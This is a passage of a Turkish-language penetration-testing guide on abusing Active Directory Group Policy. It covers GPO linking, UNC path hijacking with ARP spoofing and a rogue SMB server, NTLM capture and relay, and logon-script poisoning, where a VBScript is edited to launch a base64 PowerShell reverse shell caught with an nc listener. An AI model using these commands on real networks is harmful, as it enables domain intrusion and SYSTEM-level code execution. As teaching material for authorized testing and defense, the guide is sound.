python3 parse_sysvol.py scripts -s <SYSVOL> -b <BloodHound_Folder>
```

Mevcut GPO'yu hedef OU'ya bağlayın:

```bash
python3 link_gpo.py -u <user> -p '<pass>' -d <domain> -dc-ip <dc_ip> \
  --gpo-guid '{<gpo-guid>}' --target-ou "OU=<TargetOU>,DC=<domain>,DC=<tld>"
```

#### Software Installation UNC hijack -> SYSTEM

Bağlantılı GPO, bir MSI'ı UNC yolundan dağıtıyorsa istemci MSI'ı **bilgisayar başlangıcında** alır ve **`NT AUTHORITY\SYSTEM`** olarak yükler. Başvurulan host'u spoof edip aynı paylaşım/yol/ad altında kötü amaçlı bir MSI sunarak **SYSVOL'u değiştirmeden** `WriteGPLink` üzerinden SYSTEM düzeyinde kod çalıştırabilirsiniz.

Önemli kısıtlamalar:

- **Zamanlama önemlidir**: Yeni bağlantı, ilke yenilemesinde görülür (genellikle ~90 dakika sonra), ancak **Software Installation** genellikle **yeniden başlatma** sırasında tetiklenir.
- Windows Installer, dağıtımı genellikle paket **`ProductCode`** değeriyle izler. Ürün zaten yüklüyse dağıtım atlanabilir.
- Yükleyicinin paketi reddetmesini önlemek için sahte MSI'ı, **`ProductCode`** ve **`PackageCode`** değerleri GPO'nun beklediği meşru paketle eşleşecek şekilde yamalayın.
- Eski `.aas` reklam dosyaları `SYSVOL`'da kalabilir; bu yönteme güvenmeden önce dağıtımın hâlâ etkin göründüğünü doğrulayın.

```bash
ip addr add <unc_host_ip>/32 dev <iface>
arpspoof-ng -i <iface> -t <victim1>,<victim2> -s <unc_host_ip>
smbserver.py <share> ./payloads -smb2support --interface-address <unc_host_ip> -debug -ts
```

#### Sürücü eşlemesi UNC hijack'i -> NTLM yakalama / WebDAV relay

`Drives.xml` içindeki GPP sürücü eşlemeleri, kullanıcıların oturum açarken veya yeniden bağlanırken yapılandırılmış UNC yoluna kimlik doğrulaması yapmasına neden olur. Başvurulan host'u taklit ederseniz **NetNTLMv2** yakalayabilirsiniz. SMB'nin bilerek başarısız olmasını sağlarsanız Windows, **WebDAV** üzerinden yeniden deneyebilir ve **HTTP üzerinden NTLM** gönderebilir. Bu, **LDAP(S)**, **AD CS** veya **SMB**'ye relay işlemlerinde çok daha esnektir.

#### Logon/startup script UNC hijack'i

Aynı yöntem `SYSVOL` içinde bulunan UNC üzerinden barındırılan script'ler için de geçerlidir:

- **Logon script'leri** genellikle **kullanıcı** bağlamında çalışır.
- **Startup script'leri** genellikle **bilgisayar / SYSTEM** bağlamında çalışır.

Script yolu taklit edilebilir bir hostname'e işaret ediyorsa UNC host'unu yönlendirin ve beklenen konumdan değiştirilmiş script içeriğini sunun.

## SYSVOL/NETLOGON Logon Script Poisoning

`\\<dc>\SYSVOL\<domain>\scripts\` veya `\\<dc>\NETLOGON\` altındaki yazılabilir yollar, GPO aracılığıyla kullanıcı oturumu açılırken çalıştırılan logon script'lerinin değiştirilmesine olanak tanır. Bu, oturum açan kullanıcıların güvenlik bağlamında kod yürütülmesini sağlar.

### Logon script'lerini bulma
- Yapılandırılmış bir logon script'i olup olmadığını görmek için kullanıcı özniteliklerini inceleyin:

```powershell
Get-DomainUser -Identity <user> -Properties scriptPath, scriptpath
```

- Betiklere yönelik kısayolları veya başvuruları bulmak için domain paylaşımlarını tarayın:

```bash
# NetExec spider (authenticated)
netexec smb <dc_fqdn> -u <user> -p <pass> -M spider_plus
```

- SYSVOL/NETLOGON içindeki hedeflere işaret eden `.lnk` dosyalarını çözümlemek için ayrıştırın (DFIR için kullanışlı bir numara ve doğrudan GPO erişimi olmayan saldırganlar için):

```bash
# LnkParse3
lnkparse login.vbs.lnk
# Example target revealed:
# C:\Windows\SYSVOL\sysvol\<domain>\scripts\login.vbs
```

- BloodHound, mevcutsa kullanıcı nesnesinin `scriptPath` oturum açma betiği özniteliğini gösterir. GPO ile yapılandırılan oturum açma betikleri ayrı bir ilke başvurusudur; bu nedenle geçerli GPO'yu da inceleyin.

### Yazma erişimini doğrulayın (paylaşım listelerine güvenmeyin)
Otomatik araçlar, tam olarak ilgili betiğin farklı bir NTFS ACL'si olsa bile SYSVOL/NETLOGON'u salt okunur gösterebilir. Bu dosyayı ve üst dizinini salt okunur şekilde inceleyerek başlayın; eşleşen Allow ACE'leri hâlâ adaydır çünkü etkin SMB ve NTFS erişimi, Deny ACE'leri ve geçerli token'ın tümü önemlidir:

```powershell
Get-Acl -LiteralPath '\\dc.example.test\SYSVOL\example.test\scripts\login.vbs' |
  Format-List Owner,AccessToString
Get-Acl -LiteralPath '\\dc.example.test\SYSVOL\example.test\scripts' |
  Format-List Owner,AccessToString
```

Yetkili bir yazma testi hedefe özel ve geri alınabilir olmalı; orijinal script yedeklenip geri yüklenmelidir. Erişimi test etmek için çalışan bir logon script’in üzerine yazmayın; başarılı bir yazma işlemi, sonraki kullanıcının oturum açışında kodu çalıştırabilir.

### RCE için bir VBScript logon script’ini zehirleme
İş işlevselliğini bozmamak için orijinal mantığı koruyarak PowerShell reverse shell başlatan bir komut ekleyin (revshells.com üzerinden oluşturun):

```vb
' At top of login.vbs
Set cmdshell = CreateObject("Wscript.Shell")
cmdshell.run "powershell -e <BASE64_PAYLOAD>"

' Existing mappings remain
MapNetworkShare "\\\\<dc_fqdn>\\apps", "V"
MapNetworkShare "\\\\<dc_fqdn>\\docs", "L"
```

Host'unuzda dinleyin ve sonraki etkileşimli logon'u bekleyin:

```bash
rlwrap -cAr nc -lnvp 443
```

Notlar:
- Çalıştırma, SYSTEM yerine günlüğe kaydeden kullanıcının token'ı altında gerçekleşir. Kapsam, bu script'i uygulayan GPO bağlantısıdır (OU, site, domain).
- Kullanımdan sonra özgün içeriği/zaman damgalarını geri yükleyerek temizleyin.


## References

- [1] [Active Directory ACL/ACE'lerini kötüye kullanma](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces)
- [2] [Ayrıcalıklı Hesaplar ve Token Ayrıcalıkları](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
- [3] [BloodHound 1.3 – ACL Saldırı Yolu Güncellemesi](https://wald0.com/?p=112)
- [4] [ActiveDirectoryRights Enum - Microsoft Learn](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2)
- [5] [Active Directory'de ACL'lerle ayrıcalıkları yükseltme](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/)
- [6] [Active Directory Ayrıcalıklarını ve Ayrıcalıklı Hesapları Tarama](https://adsecurity.org/?p=3658)
- [7] [ActiveDirectoryAccessRule Constructor - Microsoft Learn](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule__ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType_)
- [8] [BloodyAD – Linux'tan AD özniteliği/UAC işlemleri](https://github.com/CravateRouge/bloodyAD)
- [9] [Samba – net rpc (grup üyeliği)](https://www.samba.org/)
- [10] [HTB Puppy: AD ACL kötüye kullanımı, KeePassXC Argon2 kırma ve DPAPI şifre çözme ile DC yöneticiliğine erişim](https://0xdf.gitlab.io/2025/09/27/htb-puppy.html)
- [11] [TrustedSec - ARP Around and Find Out: Kod çalıştırma ve NTLM relay için GPO UNC yollarını ele geçirme](https://trustedsec.com/blog/arp-around-and-find-out-hijacking-gpo-unc-paths-for-code-execution-and-ntlm-relay)
- [12] [GPOddity: NTLM relay ve diğer yöntemlerle Active Directory GPO'larını istismar etme](https://www.synacktiv.com/publications/gpoddity-exploiting-active-directory-gpos-through-ntlm-relaying-and-more)
- [13] [OU eğlenceli mi? - Petros Koutroumpis](https://labs.withsecure.com/publications/ou-having-a-laugh)
- [14] [OUned.py: Active Directory'de gizli Organizational Unit ACL saldırı vektörlerini istismar etme](https://www.synacktiv.com/publications/ounedpy-exploiting-hidden-organizational-units-acl-attack-vectors-in-active-directory)
- [15] [Ağda meşru Active Directory hizmetlerini taklit etme: GPO istismarı örneği](https://synacktiv.com/en/publications/simulating-legitimate-active-directory-services-on-the-network-the-case-of-gpo.html)
- [16] [Synacktiv GPOddity](https://github.com/synacktiv/GPOddity)
- [17] [Synacktiv OUned](https://github.com/synacktiv/OUned)
- [18] [HTB: Hercules — OU üzerinden ilerleme ve devralınan ACL'leri kötüye kullanma](https://0xdf.gitlab.io/2026/09/21/htb-hercules.html)
